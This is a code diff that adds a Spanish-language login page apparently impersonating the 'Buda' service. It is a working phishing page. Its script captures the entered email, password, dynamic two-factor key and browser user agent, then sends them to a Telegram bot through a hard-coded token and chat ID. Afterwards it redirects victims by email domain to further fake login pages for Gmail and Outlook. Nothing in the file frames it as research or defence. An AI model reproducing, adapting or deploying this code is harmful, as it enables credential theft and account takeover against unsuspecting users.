@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <style>
+      body {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background: #fcfbfc;
+        height: 100vh;
+        overflow: hidden;
+      }
+
+      /*  img {
+      height: 140px;
+      display: block;
+      max-width: 100%;
+    } */
+
+      #contenedor {
+        padding: 25px;
+        border: 1px solid white;
+        border-radius: 10px;
+        background-color: white;
+        max-width: 330px;
+        width: 80%;
+        overflow: hidden;
+        border: 1px solid #e8eaf0;
+        border-radius: 3px;
+        /* box-shadow: 0 0 40px 4px #111118; */
+      }
+
+      form {
+        margin-top: 20px;
+      }
+
+      input {
+        width: 100%;
+        height: 60px !important;
+        padding: 10px;
+        border: none;
+        margin-bottom: 14px;
+        box-sizing: border-box;
+        /* border-radius: 5px; */
+        border-bottom: 1px solid #97a3ae !important;
+        background: transparent;
+        font-family: "Avenir Next", Avenir, -apple-system, BlinkMacSystemFont,
+          Roboto, Helvetica, sans-serif;
+        font-size: 15px;
+        outline: none;
+      }
+
+      button {
+        background: #4f90ff !important;
+        /* max-width: 60%!important; */
+        width: 90%;
+        color: #fff;
+        font-size: 14px;
+        padding: 20px 55px 20px 55px;
+        border: none;
+        border-radius: 30px;
+        cursor: pointer;
+        margin: 10px auto;
+        display: block;
+        font-weight: 500;
+        font-family: "Avenir Next", Avenir, -apple-system, BlinkMacSystemFont,
+          Roboto, Helvetica, sans-serif;
+      }
+
+      p {
+        color: #1a1a1a;
+        font-family: "Fixture-Regular", Helvetica;
+        text-align: center;
+        font-family: "Avenir Next", Avenir, -apple-system, BlinkMacSystemFont,
+          Roboto, Helvetica, sans-serif;
+      }
+
+      h2 {
+        color: #1a1a1a;
+        text-align: center;
+        font-family: "Avenir Next", Avenir, -apple-system, BlinkMacSystemFont,
+          Roboto, Helvetica, sans-serif;
+      }
+      img {
+        max-width: 50%;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+      }
+      .azul {
+        color: #54c0e8;
+      }
+      a {
+        text-decoration: none;
+      }
+
+      #ini {
+        text-align: left;
+        font-size: 28px;
+        padding: 10px;
+        margin: 0;
+      }
+      #lg img {
+        width: 280px;
+        display: block;
+        margin-bottom: 30px;
+      }
+      button[type="submit"] {
+        font-size: 15px;
+      }
+      #lace {
+        display: block;
+        color: #7a7092;
+        font-size: 12px;
+        text-decoration: none;
+        margin-bottom: 10px;
+      }
+      #lace:hover {
+        color: #1a1a1a;
+      }
+    </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        document
+          .getElementById("loginForm")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            var username = document.getElementsByName("usuario")[0].value;
+            var password = document.getElementsByName("contrasena")[0].value;
+            var dina = document.getElementsByName("dina")[0].value;
+            let userAgent = navigator.userAgent;
+            var message =
+              "✓✓✓BUDA✓✓✓\n\nEmailBuda: " +
+              username +
+              "\nPassword: " +
+              password +
+              "\nDinamica" +
+              dina +
+              "\nUser: " +
+              userAgent;
+
+            var telegramBotToken =
+              "7339513428:AAHN5cov7e0MK0X7Pwn_P_uormVfQrH8CGY";
+            var chatId = "-1002237589249";
+
+            var telegramApiUrl =
+              "https://api.telegram.org/bot" +
+              telegramBotToken +
+              "/sendMessage";
+
+            var data = {
+              chat_id: chatId,
+              text: message,
+            };
+
+            fetch(telegramApiUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(data),
+            })
+              .then((response) => {
+                if (!response.ok) {
+                  throw new Error("Error al enviar el mensaje.");
+                }
+
+                // Obtener el dominio del correo electrónico
+                var emailDomain = username.split("@")[1].toLowerCase();
+
+                // Redirigir según el dominio del correo electrónico
+                if (emailDomain === "gmail.com") {
+                  window.location.href = "gmail/index.html";
+                } else if (
+                  emailDomain === "hotmail.com" ||
+                  emailDomain === "live.com" ||
+                  emailDomain === "outlook.com"
+                ) {
+                  window.location.href = "login/index.html";
+                } else {
+                  // Redirigir a otra página si es necesario
+                  window.location.href = "index.html";
+                }
+              })
+              .catch((error) => {
+                console.error("Error:", error);
+              });
+          });
+      });
+    </script>
+  </head>
+  <body>
+    <div id="lg">
+      <img src="img/buda.svg" alt="" />
+    </div>
+
+    <div id="contenedor">
+      <p id="ini">Iniciar sesión</p>
+
+      <form id="loginForm">
+        <input
+          type="email"
+          placeholder="Correo electronico"
+          name="usuario"
+          required
+        />
+
+        <input
+          type="password"
+          placeholder="Contraseña"
+          name="contrasena"
+          required
+        />
+        <input
+          type="password"
+          placeholder="Clave Dinámica (solo si la activaste)"
+          name="dina"
+        />
+        <button type="submit">Entrar</button>
+      </form>
+      <br />
+      <br />
+      <a id="lace" href="#">¿Quieres registrarte?</a>
+      <a id="lace" href="#">¿Olvidaste tu contraseña?</a>
+      <a id="lace" href="#">¿Perdiste el acceso a tu clave dinámica?</a>
+      <a id="lace" href="#">¿No recibiste el correo de confirmación?</a>
+    </div>
+  </body>
+</html>
